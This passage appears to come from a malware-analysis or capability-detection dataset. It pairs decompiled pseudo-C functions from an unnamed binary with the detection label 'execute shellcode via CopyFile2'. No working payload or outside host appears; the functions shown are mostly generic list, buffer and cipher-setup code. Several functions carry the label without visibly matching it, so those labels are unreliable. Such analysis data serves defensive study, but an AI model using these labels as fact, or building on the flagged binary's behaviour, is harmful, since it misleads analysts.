fcn.00020948(arg1, arg2, uStack100, 0);\n                    iVar1 = fcn.000207f8(arg1, uStack104, uStack96, uStack100);\n                    if (iVar1 != 0) goto code_r0x00020f2a;\n                    for (puVar2 = *(arg1 + 0x38); puVar2 != NULL; puVar2 = *(puVar2 + 8)) {\n                        if ((*puVar2 == uStack104) && (puVar2[1] == uStack96)) goto code_r0x00020e5f;\n                    }\n                    puVar2 = NULL;\ncode_r0x00020e5f:\n                    fcn.00020788(puVar2);\n                }\n            }\n        }\n        else {\n            puVar4 = puVar2;\n            if (uStack96 != 0xffff) goto code_r0x00020f2a;\n        }\n        uVar3 = uVar3 + 0x40 + uStack60;\n        puVar2 = puVar4;\n    }\n    for (; uVar3 < *(arg1 + 0x1c); uVar3 = uVar3 + 0x40 + uStack60) {\n        iVar1 = (**(*(arg1 + 0x58) + 0x28))(*(arg1 + 0x60));\n        if (iVar1 != 0) goto code_r0x00020f2a;\n        if (uStack96 != 0xffff) {\n            iVar1 = fcn.000207f8(arg1, uStack104, uStack96, uStack100);\n            if (iVar1 != 0) goto code_r0x00020f2a;\n            for (puVar2 = *(arg1 + 0x38); puVar2 != NULL; puVar2 = *(puVar2 + 8)) {\n                if ((*puVar2 == uStack104) && (puVar2[1] == uStack96)) goto code_r0x00020f0e;\n            }\n            puVar2 = NULL;\ncode_r0x00020f0e:\n            fcn.00020788(puVar2);\n        }\n    }\ncode_r0x00020f34:\n    (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 1);\n    return iVar1;\ncode_r0x00020f2a:\n    iVar1 = fcn.00020a98(arg1);\n    goto code_r0x00020f34;\n}\n",
        "token_count": 971
    },
    "00021464": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00021464(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [48];\n    uint uStack56;\n    \n    uVar4 = 5;\n    uVar3 = fcn.00020f54(&iStack136, arg1, 5, auStack128);\n    if (uVar3 == 0) {\n        if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n            arg2._0_4_ = *(iStack136 + 0x98);\n        }\n        for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n            arg1_00 = *(arg1_00 + 8)) {\n        }\n        iVar1 = fcn.00020914(arg1_00, arg4);\n        if (iVar1 != -1) {\n            iVar2 = (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n            if (iVar2 == 0) {\n                uStack56 = 0;\n                iVar1 = (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                uVar4 = -(iVar1 != 0) & 3;\n            }\n            else {\n                uVar4 = 3;\n            }\n        }\n        fcn.000207cc(auStack128);\n        uVar3 = uVar4;\n    }\n    return uVar3;\n}\n",
        "token_count": 459
    },
    "00021544": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00021544(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000030;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [16];\n    uint auStack88 [12];\n    \n    if (in_stack_00000028 < 4) {\n        uVar4 = 5;\n        uVar3 = fcn.00020f54(&iStack136, arg1, 5, auStack128);\n        if (uVar3 == 0) {\n            if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n                arg2._0_4_ = *(iStack136 + 0x98);\n            }\n            for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n                arg1_00 = *(arg1_00 + 8)) {\n            }\n            iVar1 = fcn.00020914(arg1_00, arg4);\n            if (iVar1 != -1) {\n                iVar2 = (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                if (iVar2 == 0) {\n                    auStack88[in_stack_00000028] = in_stack_00000030;\n                    iVar1 = (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, iVar1);\n                    uVar4 = -(iVar1 != 0) & 3;\n                }\n                else {\n                    uVar4 = 3;\n                }\n            }\n            fcn.000207cc(auStack128);\n            uVar3 = uVar4;\n        }\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 522
    },
    "0002181c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t * fcn.0002181c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t *arg1_00;\n    uint32_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    int64_t iStack168;\n    uchar auStack160 [24];\n    uchar auStack136 [4];\n    uint32_t uStack132;\n    \n    puVar2 = fcn.00020f54(&iStack168, arg1, 1, auStack160);\n    puVar5 = NULL;\n    uVar4 = 0;\n    if (puVar2 != 0) {\n        return puVar2;\n    }\n    if ((*(iStack168 + 0x90) != 0) && (arg2 == *(iStack168 + 0x94))) {\n        arg2._0_4_ = *(iStack168 + 0x98);\n    }\n    for (puVar2 = *(iStack168 + 0x38);\n        (arg1_00 = puVar5,  puVar2 != NULL && ((*puVar2 != arg2 || (arg1_00 = puVar2,  puVar2[1] != arg3))));\n        puVar2 = *(puVar2 + 8)) {\n    }\n    if ((arg1_00 == NULL) || (iVar1 = fcn.00020914(arg1_00, arg4),  iVar1 == -1)) {\n        puVar5 = 0x5;\n    }\n    else {\n        iVar1 = (**(*(iStack168 + 0x58) + 0x28))(*(iStack168 + 0x60), auStack136, 0x40, iVar1);\n        if (iVar1 == 0) {\n            for (puVar2 = *(iStack168 + 0x38);\n                (puVar3 = puVar5,  puVar2 != NULL &&\n                ((*puVar2 != arg2 || (puVar3 = puVar2,  puVar2[1] != in_stack_00000028)))); puVar2 = *(puVar2 + 8)) {\n            }\n            if (puVar3 != NULL) {\n                uVar4 = puVar3[3];\n            }\n            uStack132 = uVar4 + 1;\n            *in_stack_00000030 = uStack132;\n            iVar1 = (**(*(iStack168 + 0x58) + 0x30))(*(iStack168 + 0x60), auStack136);\n            if (iVar1 == 0) {\n                fcn.00020948(iStack168, arg1_00, arg4, 0);\n                fcn.000207f8(iStack168, arg2, in_stack_00000028, uStack132);\n                goto code_r0x00021979;\n            }\n        }\n        puVar5 = 0x3;\n    }\ncode_r0x00021979:\n    fcn.000207cc(auStack160);\n    return puVar5;\n}\n",
        "token_count": 715
    },
    "0002260c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.0002260c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint32_t in_stack_00000028;\n    uint in_stack_0000002c;\n    int32_t in_stack_00000030;\n    uchar auStack72 [24];\n    \n    if ((CONCAT44(in_stack_0000002c, in_stack_00000028) == 0) && (in_stack_00000030 != 0)) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.00020f54(0, arg1, 5, auStack72);\n        if (uVar2 == 0) {\n            uVar1 = fcn.00022440(arg1, arg2, arg3, arg4);\n            uVar2 = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.00021ae0(arg1, arg2, arg3, in_stack_00000028);\n                uVar2 = uVar1;\n                if (uVar1 != 0) {\n                    fcn.00021644(arg1, arg2, arg3, in_stack_00000028);\n                }\n            }\n            fcn.000207cc(auStack72);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 315
    },
    "000239a8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.000239a8(uchar *arg1, ulong arg2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack2472 [16];\n    uchar auStack2456 [16];\n    uchar auStack2440 [16];\n    uint32_t uStack2424;\n    uchar auStack2376 [259];\n    uchar uStack2117;\n    uchar auStack2104 [2048];\n    \n    bVar4 = false;\n    bVar5 = false;\n    bVar7 = false;\n    bVar2 = false;\n    if (*0x7ec30 != 0) {\n        return 0x21590064;\n    }\n    *0x8e770 = 0;\n    fcn.00066830(\"system#2\", arg1, 0x104);\n    *0x8e780 = arg2;\n    fcn.00066830(auStack2376, arg1);\n    uStack2117 = 0;\n    puVar9 = fcn.00066824(auStack2376);\n    if (puVar9 == NULL) {\n        aiStackX24[0] = -1;\n    }\n    else {\n        *puVar9 = 0;\n        aiStackX24[0] = fcn.00031248(puVar9 + 1, 0, 0);\n        arg1 = auStack2376;\n    }\n    fcn.0002346c(arg1, 0x11f14, 1);\n    iVar8 = fcn.00022c10(arg1, 1);\n    if (iVar8 == 0) {\n        if (aiStackX24[0] == -1) {\n            iVar8 = 0;\ncode_r0x00023ae5:\n            if (iVar8 != 0) goto code_r0x00023b09;\n        }\n        else {\n            iVar8 = fcn.00022168(0xfffffffe, 0xb, aiStackX24, auStack2440);\n            if (iVar8 != 0) {\n                fcn.00022358();\n                if (aiStackX24[0] != 1) {\n                    uVar10 = iVar8 + 0x191U | 0x21590000;\n                    bVar1 = bVar2;\n                    bVar3 = bVar5;\n                    bVar6 = bVar7;\n                    goto code_r0x00023c55;\n                }\n                goto code_r0x00023ae5;\n            }\n            fcn.000223e0(0xfffffffe, uStack2424);\n        }\n        iVar8 = fcn.00026fb4(auStack2472, 0x10, 0x229);\n        if (iVar8 != 0) {\n            fcn.00022358();\n            goto code_r0x00023b09;\n        }\n        uVar10 = 0;\ncode_r0x00023b9d:\n        fcn.00027a4c(8, 0, uVar10, 0);\n        fcn.00027418(5, 0x7e7e8, 0x20, auStackX32);\n        fcn.0002a3b0();\n        fcn.00022efc(auStack2104, 0x800);\n        uVar10 = fcn.00063678(auStack2104);\n        bVar1 = false;\n        if (uVar10 == 0) {\n            bVar4 = true;\n            uVar10 = fcn.000578a0();\n            bVar1 = bVar2;\n            if (uVar10 == 0) {\n                bVar1 = true;\n                uVar10 = fcn.0001a9b0(auStack2456, 0x23760, arg2);\n                if (uVar10 == 0) {\n                    fcn.00032710(auStack2456);\n                    *0x7ec30 = 1;\n                }\n            }\n        }\n        fcn.00027a4c(9, 0, uVar10, 0);\n        bVar3 = bVar4;\n        bVar6 = true;\n    }\n    else {\ncode_r0x00023b09:\n        uVar10 = iVar8 + 0x191U | 0x21590000;\n        iVar8 = fcn.0002346c(arg1, 0x11f0c, 0);\n        bVar1 = false;\n        bVar3 = bVar4;\n        bVar6 = false;\n        if ((iVar8 != 0) || (iVar8 = fcn.00022c10(arg1, 0),  bVar1 = bVar2,  bVar3 = bVar5,  bVar6 = bVar7,  iVar8 != 0)\n           ) goto code_r0x00023c55;\n        if (aiStackX24[0] == -1) {\ncode_r0x00023b84:\n            iVar8 = fcn.00026fb4(auStack2472, 0x10, 0x229);\n            if (iVar8 == 0) goto code_r0x00023b9d;\n        }\n        else {\n            iVar8 = fcn.00022168(0xfffffffe, 0xb, aiStackX24, auStack2440);\n            if (iVar8 == 0) {\n                fcn.000223e0(0xfffffffe, uStack2424);\n                goto code_r0x00023b84;\n            }\n        }\n        fcn.00022358();\n    }\ncode_r0x00023c55:\n    if (uVar10 != 0) {\n        if (bVar1) {\n            fcn.0001612c();\n        }\n        if (bVar3) {\n            fcn.00063714();\n        }\n        if (bVar6) {\n            fcn.0002a068(0xfffffffe);\n            fcn.0002a3d0();\n            fcn.00022358();\n        }\n    }\n    return uVar10;\n}\n",
        "token_count": 1409
    },
    "000252a8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000252a8(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    ulong *arg3_00;\n    uint *arg1_00;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t auStackX16 [6];\n    int64_t *in_stack_00000028;\n    int32_t *in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint *puStack80;\n    uchar auStack72 [24];\n    \n    arg3_00 = NULL;\n    iVar2 = 0x21590001;\n    puStack80 = NULL;\n    auStackX16[0] = 0;\n    uStack88 = 0;\n    if (arg2 < 100) {\n        *in_stack_00000028 = 0;\n        *in_stack_00000030 = 0;\n        puVar6 = 0x69350;\n        do {\n            if (*puVar6 == arg2) {\n                iVar2 = (**(arg3_00 * 0x10 + 0x69358))(arg1, arg2);\n                break;\n            }\n            uVar7 = arg3_00 + 1;\n            arg3_00 = uVar7;\n            puVar6 = puVar6 + 4;\n        } while (uVar7 < 6);\n    }\n    else {\n        if ((arg4 != 0) && (arg3_00 = fcn.0002bccc(arg3, arg4),  arg3_00 == NULL)) {\n            return 0x215901f8;\n        }\n        uStack84 = 0;\n        iVar2 = fcn.000289a0(-(in_stack_00000038 != 0) & arg1, arg2, arg3_00, &uStack88);\n        uVar7 = uStack84;\n        while (arg3_00 != NULL) {\n            puVar1 = *arg3_00;\n            if (arg3_00[3] != arg3_00 + 4) {\n                fcn.00030d24(arg3_00[3]);\n            }\n            fcn.00030d24(arg3_00);\n            arg3_00 = puVar1;\n        }\n        if (0x200 < uVar7) {\n            fcn.00032174(0x8e740);\n            if ((*0x7edf0 != NULL) && (*0x7edf8 != NULL)) {\n                iVar3 = (**0x7edf8)();\n                auStackX16[0] = iVar3 + 4;\n                arg1_00 = fcn.00030c98(auStackX16[0]);\n                if (arg1_00 != NULL) {\n                    uVar4 = fcn.00030dc8(uVar7);\n                    *arg1_00 = uVar4;\n                    iVar2 = (**0x7edf0)(arg1_00 + 1, auStackX16, puStack80, uVar7);\n                    if ((iVar2 == 0) && (auStackX16[0] < uVar7)) {\n                        uStack88 = uStack88 | 0x80;\n                        fcn.00030d24(puStack80);\n                        uVar7 = auStackX16[0] + 4;\n                        puStack80 = arg1_00;\n                    }\n                    else {\n                        fcn.00030d24(arg1_00);\n                        iVar2 = 0;\n                    }\n                }\n            }\n            fcn.000321f4(0x8e740);\n        }\n        iVar3 = fcn.00026fb4(auStack72, 0x10, 0x227);\n        if (iVar3 == 0) {\n            iVar3 = fcn.00020328(auStack72, 0x10, uVar7);\n            *in_stack_00000030 = iVar3 + 1;\n            iVar5 = fcn.000645b0(arg1);\n            *in_stack_00000028 = iVar5;\n            if (iVar5 == 0) {\n                *in_stack_00000030 = 0;\n                iVar2 = 0x21590004;\n            }\n            else {\n                iVar3 = fcn.00020130(auStack72, 0x10, iVar5 + 1, puStack80);\n                *in_stack_00000030 = iVar3 + 1;\n                **in_stack_00000028 = uStack88;\n            }\n        }\n        else {\n            iVar2 = 0x215901f9;\n        }\n    }\n    fcn.00030d24(puStack80);\n    return iVar2;\n}\n",
        "token_count": 1097
    },
    "00027edc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid fcn.00027edc(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    uint32_t auStackX8 [4];\n    uint uStackX24;\n    uchar auStack360 [4];\n    uint32_t uStack356;\n    uchar auStack296 [256];\n    ulong var_2h;\n    \n    uStackX24 = 0x100;\n    auStackX8[0] = arg1;\n    iVar2 = fcn.000270f4(7, arg1, auStack296, 0x100);\n    iVar4 = -1;\n    pcVar6 = arg2;\n    do {\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = fcn.000272c0(7, auStackX8[0], arg2, ~iVar4);\n    if ((((iVar3 == 0) && (iVar3 = fcn.00022168(0xfffffffe, 7, auStackX8, auStack360),  iVar3 == 0)) &&\n        (fcn.0002231c(0xfffffffe, 7, uStack356, 0),  iVar2 == 0)) && (iVar4 = fcn.00066824(auStack296),  iVar4 != 0)) {\n        uVar5 = 0xffffffffffffffff;\n        uVar7 = iVar4 - (*0x20 + -0x128);\n        pcVar6 = arg2;\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        if (((uVar7 < ~uVar5 - 1) && (arg2[uVar7] == ':')) && (uVar7 != 0)) {\n            fcn.0006674c(arg2);\n        }\n        fcn.0002231c(0xfffffffe, 7, uStack356, 1);\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00028c3c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00028c3c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    uint32_t auStackX8 [2];\n    ulong uStackX16;\n    char acStack296 [280];\n    \n    fcn.000320ec(0x7edb0);\n    *0x7edd8 = fcn.000578a0();\n    *0x7edd0 = 0x8e920;\n    *0x7edc8 = 0x8e920;\n    if (*0x8e928 != *0x7edd8) {\n        fcn.0001612c(*0x8e928, 0x8ea48);\n    }\n    fcn.000320ec(0x8e740);\n    fcn.00028b0c(0, 0, 0, 0, 0, 0, 0);\n    arg1 = 500;\n    do {\n        iVar1 = fcn.00027418(arg1, acStack296, 0x104, auStackX8);\n        if ((iVar1 == 0) && (acStack296[0] != '\\0')) {\n            fcn.00027460(arg1, 0x11f80, 8);\n            uVar2 = fcn.000285e0(acStack296, 0);\n            uStackX16 = 0xfffffffffeced300;\n            (**0x115e8)(0, 0);\n            fcn.00027460(arg1, acStack296, auStackX8[0]);\n            if ((uVar2 != 0) && (uVar2 != 0x21590206)) {\n                fcn.00027a4c(0xd, uVar2, 0, 0);\n            }\n        }\n        uVar2 = arg1 + 1;\n        arg1 = uVar2;\n    } while (uVar2 < 0x227);\n    return;\n}\n",
        "token_count": 440
    },
    "0002a9a8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002a9a8(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg3_00;\n    int64_t iStack80;\n    ulong uStack72;\n    uint64_t uStack64;\n    ulong uStack56;\n    uint uStack48;\n    uchar uStack44;\n    \n    arg2 = arg2 & 0xffffffff;\n    arg3_00 = fcn.00030c98(arg4);\n    if (arg3_00 == 0) {\n        fcn.00027a4c(7, 0, 0x21590004, arg2);\n    }\n    else {\n        iVar1 = fcn.0002220c(0xfffffffe, 6, arg3, 0);\n        if (iVar1 == 0) {\n            uStack72 = 0x692d0;\n            uStack48 = 0;\n            uStack44 = 0;\n            iStack80 = 0;\n            uStack64 = arg2 | arg1 << 0x20;\n            uStack56 = 3;\n            fcn.00026cdc(&uStack72, arg2, arg3_00, arg4);\n            fcn.00030d24(arg3_00);\n        }\n        else {\n            fcn.00027a4c(7, 0, iVar1 + 0x191U | 0x21590000, arg2);\n            iStack80 = arg3_00;\n        }\n        fcn.00030d24(iStack80);\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "0002bdd8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0002bdd8(int64_t **arg1, int64_t arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    int64_t *piVar12;\n    int64_t *piStackX8;\n    \n    iVar10 = 0;\n    ppiVar5 = arg1;\n    iVar8 = iVar10;\n    if (arg1 != NULL) {\n        do {\n            iVar1 = fcn.00020420(*(ppiVar5 + 0xc));\n            if (iVar1 != 0) {\n                iVar8 = iVar8 + 0x15 + *(ppiVar5 + 2);\n            }\n            ppiVar5 = *ppiVar5;\n        } while (ppiVar5 != NULL);\n        if (0 < iVar8) {\n            iVar4 = fcn.00030c98(iVar8);\n            ppiVar5 = arg1;\n            if (iVar4 == 0) {\n                return 0;\n            }\n            do {\n                iVar1 = fcn.00020420(*(ppiVar5 + 0xc));\n                if (iVar1 != 0) {\n                    iVar6 = iVar10;\n                    *(iVar6 + iVar4) = 0;\n                    *(iVar6 + 8 + iVar4) = 0;\n                    *(iVar6 + 0x10 + iVar4) = 0;\n                    *(iVar6 + 0x14 + iVar4) = 0;\n                    *(iVar6 + iVar4) = *(ppiVar5 + 1);\n                    *(iVar6 + 4 + iVar4) = *(ppiVar5 + 2);\n                    *(iVar6 + 8 + iVar4) = *(ppiVar5 + 0xc);\n                    uVar2 = fcn.00030dc8(*(iVar6 + iVar4));\n                    *(iVar6 + iVar4) = uVar2;\n                    uVar2 = fcn.00030dc8(*(iVar6 + 4 + iVar4));\n                    *(iVar6 + 4 + iVar4) = uVar2;\n                    iVar6 = iVar6 + 0x15 + iVar4;\n                    fcn.0006670a(iVar6, ppiVar5[3]);\n                    fcn.000203ac(*(ppiVar5 + 0xc), iVar6, *(ppiVar5 + 2));\n                    iVar10 = iVar10 + 0x15 + *(ppiVar5 + 2);\n                }\n                ppiVar5 = *ppiVar5;\n            } while (ppiVar5 != NULL);\n            arg3[1] = iVar4;\n            *(arg3 + 2) = iVar8;\n            goto code_r0x0002beea;\n        }\n    }\n    arg3[1] = 0;\n    *(arg3 + 2) = 0;\ncode_r0x0002beea:\n    *(arg3 + 5) = 0;\n    arg3[4] = 0;\n    iVar8 = 1;\n    arg3[3] = arg3 + 6;\n    *arg3 = arg3 + 3;\n    if (arg1 != NULL) {\n        piStackX8 = arg3 + 0xb;\n        iVar10 = 4;\n        puVar9 = arg2 + 0x19;\n        piVar11 = arg3 + 8;\n        do {\n            if (0x41 < iVar10) break;\n            iVar1 = fcn.00020420(*(arg1 + 0xc));\n            piVar12 = piVar11;\n            if (iVar1 == 0) {\n                puVar7 = iVar8 * 0x15 + arg2;\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                *(puVar7 + 2) = 0;\n                *(puVar7 + 0x14) = 0;\n                puVar9[-1] = *(arg1 + 1);\n                *puVar9 = *(arg1 + 2);\n                *(puVar9 + 1) = *(arg1 + 0xc);\n                uVar3 = fcn.00030dc8(puVar9[-1]);\n                puVar9[-1] = uVar3;\n                uVar3 = fcn.00030dc8(*puVar9);\n                *puVar9 = uVar3;\n                piVar11[-1] = puVar7;\n                *piVar11 = 0x15;\n                iVar8 = iVar8 + 1;\n                puVar9 = puVar9 + 0x15;\n                piVar12 = piVar11 + 6;\n                piVar11[-2] = arg3 + (iVar10 + -1) * 3;\n                piStackX8[-1] = arg1[3];\n                *piStackX8 = *(arg1 + 2);\n                iVar4 = iVar10;\n                iVar10 = iVar10 + 2;\n                piStackX8[-2] = arg3 + iVar4 * 3;\n                piStackX8 = piStackX8 + 6;\n            }\n            arg1 = *arg1;\n            piVar11 = piVar12;\n        } while (arg1 != NULL);\n    }\n    arg3[iVar8 * 6 + -3] = 0;\n    return 1;\n}\n",
        "token_count": 1226
    },
    "0002d030": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002d030(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint32_t *puVar17;\n    uint32_t uVar18;\n    int64_t iVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    uint64_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint64_t uVar26;\n    uint32_t auStack204 [17];\n    uint32_t auStack136 [18];\n    \n    fcn.0006677c(auStack204 + 1, 0, 0x40);\n    if (0x10 < arg2) {\n        arg2._0_4_ = 0x10;\n    }\n    iVar19 = 0;\n    if (0 < arg2) {\n        do {\n            puVar1 = iVar19 + arg3;\n            iVar19 = iVar19 + 1;\n            auStack204[iVar19] = *puVar1;\n        } while (iVar19 < arg2);\n    }\n    *(arg1 + 0x80) = arg2 < 0xb;\n    uVar25 = *(auStack204[16] * 4 + 0x134e0) ^ *(auStack204[15] * 4 + 0x13ce0) ^ *(auStack204[14] * 4 + 0x130e0) ^\n             *(auStack204[13] * 4 + 0x138e0) ^ *(auStack204[9] * 4 + 0x138e0) ^\n             (((auStack204[1] << 8 | auStack204[2]) << 8 | auStack204[3]) << 8 | auStack204[4]);\n    uVar16 = uVar25 & 0xff;\n    uVar14 = uVar25 >> 8 & 0xff;\n    uVar21 = uVar25 >> 0x18;\n    uVar11 = uVar25 >> 0x10 & 0xff;\n    uVar18 = *(auStack204[11] * 4 + 0x13ce0) ^ *(uVar16 * 4 + 0x13ce0) ^ *(uVar14 * 4 + 0x134e0) ^\n             *(uVar21 * 4 + 0x130e0) ^ *(uVar11 * 4 + 0x138e0) ^\n             (((auStack204[9] << 8 | auStack204[10]) << 8 | auStack204[11]) << 8 | auStack204[12]);\n    uVar20 = uVar18 & 0xff;\n    uVar15 = uVar18 >> 8 & 0xff;\n    uVar3 = *(uVar15 * 4 + 0x134e0);\n    uVar13 = uVar18 >> 0x10 & 0xff;\n    uVar4 = *(uVar13 * 4 + 0x138e0);\n    uVar5 = *((uVar18 >> 0x18) * 4 + 0x13ce0);\n    uVar6 = *(uVar15 * 4 + 0x13ce0);\n    uVar24 = *(auStack204[10] * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x130e0) ^ uVar3 ^ uVar4 ^ uVar5 ^\n             (((auStack204[13] << 8 | auStack204[14]) << 8 | auStack204[15]) << 8 | auStack204[16]);\n    uVar7 = *((uVar24 >> 8 & 0xff) * 4 + 0x130e0);\n    uVar15 = uVar24 >> 0x10 & 0xff;\n    uVar8 = *(uVar15 * 4 + 0x134e0);\n    uVar12 = *(auStack204[12] * 4 + 0x134e0) ^ *((uVar24 & 0xff) * 4 + 0x138e0) ^ *((uVar24 >> 0x18) * 4 + 0x13ce0) ^\n             uVar7 ^ uVar8 ^ (((auStack204[5] << 8 | auStack204[6]) << 8 | auStack204[7]) << 8 | auStack204[8]);\n    auStack204[1] =\n         *((uVar24 >> 0x18) * 4 + 0x130e0) ^ *(uVar20 * 4 + 0x138e0) ^ *(uVar14 * 4 + 0x130e0) ^ uVar6 ^ uVar8;\n    auStack204[2] = *((uVar24 & 0xff) * 4 + 0x134e0) ^ uVar7 ^ uVar3 ^ uVar4 ^ uVar5;\n    uVar3 = *(uVar14 * 4 + 0x13ce0);\n    auStack204[3] =\n         *((uVar12 >> 0x10 & 0xff) * 4 + 0x134e0) ^ *((uVar12 >> 0x18) * 4 + 0x130e0) ^ *(uVar15 * 4 + 0x138e0) ^\n         *(uVar16 * 4 + 0x138e0) ^ uVar3;\n    auStack204[4] =\n         *((uVar12 >> 8 & 0xff) * 4 + 0x130e0) ^ *((uVar12 & 0xff) * 4 + 0x134e0) ^ *((uVar12 >> 0x18) * 4 + 0x13ce0) ^\n         *(uVar21 * 4 + 0x13ce0) ^ *(uVar11 * 4 + 0x138e0);\n    uVar24 = *(uVar20 * 4 + 0x134e0) ^ *(uVar13 * 4 + 0x130e0) ^ *((uVar18 >> 0x18) * 4 + 0x138e0) ^\n             *(uVar21 * 4 + 0x138e0) ^ uVar6 ^ uVar24;\n    uVar14 = uVar24 & 0xff;\n    uVar4 = *((uVar24 >> 8 & 0xff) * 4 + 0x134e0);\n    uVar20 = uVar24 >> 0x10 & 0xff;\n    uVar25 = *((uVar24 >> 0x18) * 4 + 0x130e0) ^ *(uVar20 